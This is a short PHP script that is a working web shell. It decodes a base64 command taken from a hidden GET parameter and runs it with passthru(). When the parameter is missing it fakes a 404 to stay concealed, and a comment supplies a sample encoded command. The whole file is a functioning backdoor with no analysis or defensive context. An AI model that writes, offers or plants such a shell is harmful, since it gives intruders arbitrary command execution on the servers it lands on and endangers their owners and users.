<?php
// this is the simple bit of code with a known GET parameter
// to test this out, try ?n4v4ac=bHMgLWxh   

if (!empty($_GET['n4v4ac'])) {
  $command = base64_decode($_GET['n4v4ac']);
  passthru($command);
}
else {
  die(header("HTTP/1.0 404 Not Found"));
}
